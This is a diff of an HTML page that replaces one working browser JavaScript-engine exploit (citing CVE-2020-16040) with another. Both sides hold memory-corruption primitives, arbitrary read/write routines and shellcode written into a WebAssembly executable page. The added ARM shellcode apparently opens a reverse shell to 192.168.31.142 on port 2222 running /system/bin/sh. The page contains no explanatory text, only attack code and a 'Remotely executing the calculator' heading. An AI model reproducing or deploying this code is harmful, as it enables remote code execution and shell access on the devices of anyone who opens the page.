@@ -1,122 +1,145 @@
-
-<!DOCTYPE html>
 <html>
-    <head>
+<body>
 <script>
-
-// Reference: https://faraz.faith/2021-01-07-cve-2020-16040-analysis/
-
-var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
-var wasm_mod = new WebAssembly.Module(wasm_code);
-var wasm_instance = new WebAssembly.Instance(wasm_mod);
-var f = wasm_instance.exports.main;
-
 var buf = new ArrayBuffer(8);
 var f64_buf = new Float64Array(buf);
 var u64_buf = new Uint32Array(buf);
-let buf2 = new ArrayBuffer(0x150);
+
+var arraybuf = new ArrayBuffer(0x13373);
+var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
+var mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(mod);
+var shell = wasm_instance.exports.shell;
+var obj_array = [1337331,1337332,1337333,1337334,wasm_instance,wasm_instance,1337336,1337337];
+
+var shellcode = new Uint8Array([1, 0, 143, 226, 16, 255, 47, 225, 0, 32, 213, 39, 0, 223, 2, 32,
+ 0, 18, 6, 34, 250, 39, 31, 55, 0, 223, 4, 28, 13, 161, 16, 34,
+ 250, 39, 33, 55, 0, 223, 32, 28, 0, 33, 63, 39, 0, 223, 32, 28,
+ 1, 33, 63, 39, 0, 223, 32, 28, 2, 33, 63, 39, 0, 223, 7, 160,
+ 0, 33, 2, 180, 1, 180, 105, 70, 0, 34, 11, 39, 0, 223, 0, 32,
+ 1, 39, 0, 223, 2, 0, 8, 174, 192, 168, 31, 142, 47, 115, 121,
+ 115, 116, 101, 109, 47, 98, 105, 110, 47, 115, 104, 0, 0]);
 
 function ftoi(val) {
-    f64_buf[0] = val;
-    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+         f64_buf[0] = val;
+         return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
 }
-
 function itof(val) {
-    u64_buf[0] = Number(val & 0xffffffffn);
-    u64_buf[1] = Number(val >> 32n);
-    return f64_buf[0];
+         u64_buf[0] = Number(val & 0xffffffffn);
+         u64_buf[1] = Number(val >> 32n);
+         return f64_buf[0];
 }
 
-function foo(a) {
-  var y = 0x7fffffff;
+array = Array(0x40000).fill(1.1);
+args = Array(0x100 - 1).fill(array);
+args.push(Array(0x40000 - 4).fill(2.2));
+giant_array = Array.prototype.concat.apply([], args);
+giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
 
-  if (a == NaN) y = NaN;
-  if (a) y = -1;
+length_as_double =
+    new Float64Array(new BigUint64Array([0x2424242400000001n]).buffer)[0];
 
-  let z = y + 1;
-  z >>= 31;
-  z = 0x80000000 - Math.sign(z|1);
+function trigger(array) {
+  var x = array.length;
+  x -= 67108861;
+  x = Math.max(x, 0);
+  x *= 6;
+  x -= 5;
+  x = Math.max(x, 0);
 
-  if(a) z = 0;
+  let corrupting_array = [0.1, 0.1];
+  let corrupted_array = [0.1];
 
-  var arr = new Array(0-Math.sign(z));
-  arr.shift();
-  var cor = [1.1, 1.2, 1.3];
-
-  return [arr, cor];
+  corrupting_array[x] = length_as_double;
+  return [corrupting_array, corrupted_array];
 }
 
-
-for(var i=0;i<0x3000;++i)
-    foo(true);
-
-
-var x = foo(false);
-
-var arr = x[0];
-var cor = x[1];
-// document.write(arr,cor);
-
-const idx = 6;
-arr[idx+10] = 0x4242;
-
-function addrof(k) {
-    arr[idx+1] = k;
-    return ftoi(cor[0]) & 0xffffffffn;
+for (let i = 0; i < 30000; ++i) {
+  trigger(giant_array);
 }
 
-function fakeobj(k) {
-    cor[0] = itof(k);
-    return arr[idx+1];
+corrupted_array = trigger(giant_array)[1];
+
+var search_space = [[(0x8040000-8)/8, 0x805b000/8], [(0x805b000)/8, (0x83c1000/8)-1], [0x8400000/8, (0x8701000/8)-1], [0x8740000/8, (0x8ac1000/8)-1], [0x8b00000/8, (0x9101000/8)-1]];
+function searchmem(value)
+{
+	skip = 0;
+	for(i=0; i<search_space.length; ++i)
+	{
+		for(j=search_space[i][0];j<search_space[i][1];++j)
+		{
+			if(((ftoi(corrupted_array[j])) >> 32n) === value || (((ftoi(corrupted_array[j])) & 0xffffffffn) === value))
+			{
+				if(skip++ == 2) // Probably the first two are due to the search itself
+					return j;
+			}
+		}
+	}
+	return -1;
 }
 
-var float_array_map = ftoi(cor[3]);
-
-var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
-var fake = fakeobj(addrof(arr2) + 0x20n);
-
-function arbread(addr) {
-    if (addr % 2n == 0) {
-        addr += 1n;
-    }
-    arr2[1] = itof((2n << 32n) + addr - 8n);
-    return (fake[0]);
+function searchmem_full(value)
+{
+	for(i=0;i<search_space.length;++i)
+	{
+		for(j=search_space[i][0];j<search_space[i][1];++j)
+		{
+			if((ftoi(corrupted_array[j]) === value))
+			{
+				if((((ftoi(corrupted_array[j+2]) >> 56n) & 0xffn) == 8n) && (((ftoi(corrupted_array[j+2]) >> 24n) & 0xffn) == 8n))
+				{
+					return j;
+				}
+			}
+		}
+	}
+	return -1;
 }
 
-function arbwrite(addr, val) {
-    if (addr % 2n == 0) {
-        addr += 1n;
-    }
-    arr2[1] = itof((2n << 32n) + addr - 8n);
-    fake[0] = itof(BigInt(val));
+var arraybuf_idx = searchmem(0x13373n);
+if(arraybuf_idx == -1)
+{
+	alert('Failed 1');
+	throw new Error("Not found");
+}
+document.write("Found arraybuf at idx: " + arraybuf_idx + "<br>");
+function arb_read(addr, length)
+{
+	var data = [];
+	let u8_arraybuf = new Uint8Array(arraybuf);
+	corrupted_array[arraybuf_idx+1] = itof(addr);
+	for(i=0;i<length;++i)
+		data.push(u8_arraybuf[i]);
+	return data;
 }
 
-function copy_shellcode(addr, shellcode) {
-    let dataview = new DataView(buf2);
-    let buf_addr = addrof(buf2);
-    let backing_store_addr = buf_addr + 0x14n;
-    arbwrite(backing_store_addr, addr);
-
-    for (let i = 0; i < shellcode.length; i++) {
-        dataview.setUint32(4*i, shellcode[i], true);
-    }
+function arb_write(addr, data)
+{
+	corrupted_array[arraybuf_idx+1] = itof(addr);
+	let u8_arraybuf = new Uint8Array(arraybuf);
+	for(i=0;i<data.length;++i)
+		u8_arraybuf[i] = data[i];
 }
 
-var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
-// document.write("\n");
-// document.write("[+] Address of rwx page:"+rwx_page_addr.toString(16));
+idx = searchmem_full((1337332n << 33n) + (1337331n << 1n));
+if (idx == -1)
+{
+	alert('Failed 2');
+	throw new Error("Not found");
+}
 
-console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
-//var shellcode = [16814050, 285159393, 2151719, 14615072, 18941474, 4196867895, 14615580, 228659234, 4196868407, 14622748, 2178855, 14622748, 18956071, 14622748, 35733287, 14616480, 2163380, 28600646, 2231079, 14614560, 19333343, 33556654, 3232243598, 796096883, 1952804143, 1651076655, 1936195584];
-//var shellcode = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];  // windows shellcode
-var shellcoee = [23105506,385822689,1360826906,251826204,31398199,35784220,288494082,1546785282,605805338,1766223131,272186561,20385826,807141855,37177626,807141855,20419098,102498783,1059539226,807141855,31392049,20000796,2451177951,305166406,26215058,187105705,605749727,19341340,1647247839,1932488297,2425356392]
-copy_shellcode(rwx_page_addr, shellcode);
-// copy_shellcode(0x0, shellcode);
-f();
-
+wasm_addr = ftoi(corrupted_array[idx+2]) & 0xffffffffn;
+document.write("Wasm instance: 0x"+wasm_addr.toString(16) + "<br>");
+rwx_idx = Number((wasm_addr-1n+0x68n)/8n);
+rwx_addr = ftoi(corrupted_array[rwx_idx-1]);
+if ((wasm_addr & 0xfn) == 5n || (wasm_addr & 0xfn) == 0xdn)
+{
+	rwx_addr >>= 32n;
+	rwx_addr += (ftoi(corrupted_array[rwx_idx]) & 0xffffffffn) << 32n;
+}
+document.write("rwx addr: 0x"+rwx_addr.toString(16));
+arb_write(rwx_addr, shellcode);
+shell();
 </script>
-</head>
-    <body>
-<h1> Remotely executing the calculator </h1>
-    </body>
+</body>
 </html>
